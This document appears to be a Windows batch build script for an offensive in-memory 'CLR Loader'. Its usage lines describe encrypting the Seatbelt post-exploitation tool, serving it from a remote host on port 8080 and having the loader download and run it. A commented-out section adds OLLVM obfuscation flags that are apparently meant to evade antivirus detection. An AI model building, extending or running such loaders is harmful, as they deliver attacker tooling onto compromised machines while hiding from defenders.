@echo off
REM ============================================================
REM CLR Loader - Build Script
REM v1: MSVC compilation (validate correctness)
REM v2: Switch to OLLVM for obfuscation
REM ============================================================

set OUTPUT=clr_loader.exe
set SRC=main.c
set LIBS=ole32.lib oleaut32.lib ws2_32.lib advapi32.lib

REM --- v1: MSVC Build ---
echo [*] Building with MSVC...
cl.exe /nologo /O2 /W3 %SRC% /Fe:%OUTPUT% /link %LIBS%

if %ERRORLEVEL% neq 0 (
    echo [-] Build failed
    exit /b 1
)

echo [+] Built: %OUTPUT%
echo.
echo [*] Usage:
echo     1. Encrypt:  python encrypt.py Seatbelt.exe MyKey -o payload
echo     2. Serve:    python serve.py -d payload -p 8080
echo     3. Execute:  %OUTPUT% 192.168.1.10 8080 /Seatbelt.enc MyKey -- -group=all
echo.

REM --- v2: OLLVM Build (uncomment when ready) ---
REM set OLLVM_BIN="C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\Llvm\x64\bin"
REM set OLLVM_FLAGS=-Xclang -flegacy-pass-manager -mllvm -sub -mllvm -split -mllvm -fla -mllvm -bcf
REM %OLLVM_BIN%\clang-cl.exe %OLLVM_FLAGS% /O2 %SRC% /Fe:%OUTPUT% /link %LIBS%
